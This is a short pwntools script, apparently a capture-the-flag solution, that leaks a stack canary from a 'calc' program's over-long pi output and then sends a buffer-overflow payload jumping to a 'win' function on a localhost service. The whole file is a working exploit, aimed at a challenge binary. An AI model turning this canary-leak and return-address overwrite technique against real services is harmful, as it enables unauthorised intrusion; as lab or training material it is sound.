#!/usr/bin/python
from pwn import *

context.terminal = "kitty"

path = "./calc"

e = ELF(path)
breakpoints = {
    "main": [468],\
    "print_pi": [0],\
    "win": [0],\
}

gdb_args = ""
for (function, breaks) in breakpoints.items():
    gdb_args += "\n".join(f"b *{function}+{b}" for b in breaks) + "\n"
log.info(gdb_args)
# io = gdb.debug(path, gdb_args)
# io = process(path)
io = remote("localhost", 8005)

prefix = "Using pi with 10016 digits of precision. That is: "

io.recvuntil(b'operand: ')
io.sendline(b'pi')
io.recvuntil(b'use: ')
io.sendline(b'10014')
line = io.recvline()
line = line[(10016 + len(prefix) - 8):]
line = line[:-1]
canary = u64(line)

log.info(f"Canary: {canary:02x}")

io.recvuntil(b'operator: ')

io.sendline(b'+')

io.recvuntil(b'operand: ')

io.sendline(b'3')

ret_addr = p64(0x40101a)
win_addr = p64(0x4012f6)
canary_offset = cyclic_find(0x6161616b)

io.recvuntil(b'here: ')
payload = b'a' * canary_offset\
    + p64(canary)\
    + b'b' * 8\
    + ret_addr\
    + win_addr

log.info(payload)

io.sendline(payload)

io.interactive()
